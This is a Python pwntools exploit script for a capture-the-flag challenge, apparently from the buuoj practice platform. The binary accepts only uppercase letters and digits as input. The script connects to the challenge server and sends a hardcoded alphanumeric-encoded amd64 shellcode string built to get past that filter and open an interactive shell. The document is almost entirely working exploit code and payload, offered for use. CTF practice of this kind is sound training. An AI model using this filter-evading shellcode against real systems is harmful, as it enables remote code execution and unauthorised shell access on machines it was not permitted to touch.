'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)

input shellcode
constraints: ( buf > 90 || buf <= 47 || buf > 57 && buf <= 64 ) break;
           | ( buf > 47 && buf <= 57 || buf > 64 && buf <= 90 ) pass;
           | 0 1 2 3 4 5 6 7 8 9 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
'''

from pwn import *
# from ae64 import AE64
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "28735" 
filename = "./shellcodere"
elf = ELF(filename)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)
    pass

def B():
    gdb.attach(io)
    pause()

# upper letters and numbers alphanumeric shellcode
shellcode = 'RYH1YZH3YZ2YI0YJ0YN0YQ0YY2YIH3YJH3YRST2YK0Y8WZ0Y94O4D40WGF2YT0YC0YDOE0003RH607H60R5TYY5EXR'

def pwn():
    # payload = AE64().encode(shellcode) # contains lower letter
    # payload = payload.ljust(0x100, b"\x90")
    # io.sendafter(b"magic\n", payload)
    io.sendlineafter(b"magic\n", shellcode)


if __name__ == "__main__":
    pwn()
    io.interactive()
